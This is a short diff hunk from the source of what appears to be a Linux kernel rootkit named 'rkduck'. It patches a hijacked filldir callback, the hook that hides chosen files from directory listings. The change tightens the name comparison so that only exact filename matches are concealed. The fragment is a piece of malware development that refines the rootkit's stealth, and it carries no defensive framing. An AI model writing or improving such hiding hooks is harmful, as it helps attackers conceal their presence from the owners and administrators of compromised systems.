@@ -68,7 +68,7 @@ static int vfs_hijacked_filldir(struct dir_context *ctx, const char *name, int n
         filename = strrchr(h_file->path, '/') + 1;
         dbg("rkduck: \t- %s\n", filename);
 
-        if (!strncmp(name, filename, strlen(name))) {
+        if (!strncmp(name, filename, strlen(name) + 1)) {
             return 0;
         }
     }
